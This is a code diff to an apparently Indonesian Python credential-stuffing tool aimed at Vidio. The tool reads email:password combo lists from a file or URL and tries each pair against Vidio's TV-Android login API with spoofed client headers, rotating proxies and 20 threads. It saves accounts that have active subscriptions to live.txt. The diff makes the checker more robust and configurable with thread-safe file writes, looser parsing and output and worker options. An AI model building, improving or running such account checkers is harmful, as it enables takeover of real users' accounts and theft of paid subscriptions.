@@ -5,12 +5,16 @@ import uuid
 import requests
 from colorama import Fore, init
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock
 
 from config import X_API_AUTH
 from proxy_manager import ProxyManager
 
 userAgent_vidio = "tv-android/2.46.10 (743)"
 xApiInfo_vidio = "tv-android/10/2.46.10-743"
+
+# Lock global untuk operasi file agar thread-safe
+file_lock = Lock()
 
 def session_id():
     return str(uuid.uuid4())
@@ -78,26 +82,33 @@ def fungsi_get_subs(user_token, email):
 
 def save_to_file(email, password, filename="live.txt"):
     entry = f"{email}:{password}"
-    if os.path.exists(filename):
-        with open(filename, "r") as f:
-            data = f.read().splitlines()
-        if entry in data:
-            print(Fore.YELLOW + f"[!] {email} sudah ada di file.")
-            return
-    with open(filename, "a") as f:
-        f.write(entry + "\n")
+    with file_lock:
+        if os.path.exists(filename):
+            with open(filename, "r") as f:
+                data = f.read().splitlines()
+            if entry in data:
+                print(Fore.YELLOW + f"[!] {email} sudah ada di file.")
+                return
+        with open(filename, "a") as f:
+            f.write(entry + "\n")
     print(Fore.GREEN + f"[✓] {email} disimpan ke file.")
 
 
-def proses_satu_akun(line, proxy_manager):
-    pattern = re.compile(r"^https?://(?:www\.|m\.)?vidio\.com:([^:]+):(.+)$")
-    match = pattern.match(line)
-    if not match:
+def parse_credentials(line: str):
+    line = line.strip()
+    if "://" in line:
+        line = line.split("://", 1)[1]
+    parts = line.split(":", 2)
+    if len(parts) != 3:
+        return None, None
+    return parts[1].strip(), parts[2].strip()
+
+
+def proses_satu_akun(line, proxy_manager, output_file):
+    email, password = parse_credentials(line)
+    if not email or not password:
         print(Fore.RED + f"Format salah: {line}")
         return
-
-    email = match.group(1).strip()
-    password = match.group(2).strip()
     print(Fore.CYAN + f"[•] Proses login {email}")
 
     login_response = fungsi_login(email=email, password=password, proxy_manager=proxy_manager)
@@ -110,7 +121,7 @@ def proses_satu_akun(line, proxy_manager):
             subs = fungsi_get_subs(user_token, user_email)
             if subs == "ACTIVE":
                 print(Fore.GREEN + f"[✓] {email} Langganan Aktif")
-                save_to_file(email, password)
+                save_to_file(email, password, filename=output_file)
             elif subs == "INACTIVE":
                 print(Fore.YELLOW + f"[!] {email} Tidak ada langganan aktif")
             else:
@@ -121,7 +132,7 @@ def proses_satu_akun(line, proxy_manager):
         print(Fore.RED + f"[X] Login gagal untuk {email}")
 
 
-def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None, workers: int = 20):
+def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None, workers: int = 20, output_file="live.txt"):
     if re.match(r"^https?://", file_akun):
         try:
             resp = requests.get(file_akun, timeout=10)
@@ -137,7 +148,7 @@ def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None, worker
     print(Fore.BLUE + f"[•] Total akun: {len(lines)} — memproses dengan {workers} thread...")
 
     with ThreadPoolExecutor(max_workers=workers) as executor:
-        futures = [executor.submit(proses_satu_akun, line, proxy_manager) for line in lines]
+        futures = [executor.submit(proses_satu_akun, line, proxy_manager, output_file) for line in lines]
         for future in as_completed(futures):
             future.result()
 
@@ -147,6 +158,8 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument("akun", nargs="?", default="akun.txt", help="Path atau URL daftar akun")
     parser.add_argument("--use-proxy", action="store_true", help="Gunakan proxy saat request")
+    parser.add_argument("--output", default="live.txt", help="File output untuk akun aktif")
+    parser.add_argument("--workers", type=int, default=20, help="Jumlah thread untuk memproses akun")
     args = parser.parse_args()
 
     pm = None
@@ -154,4 +167,4 @@ if __name__ == "__main__":
         pm = ProxyManager()
         pm.download_proxies()
 
-    proses_akun(args.akun, proxy_manager=pm)
+    proses_akun(args.akun, proxy_manager=pm, workers=args.workers, output_file=args.output)
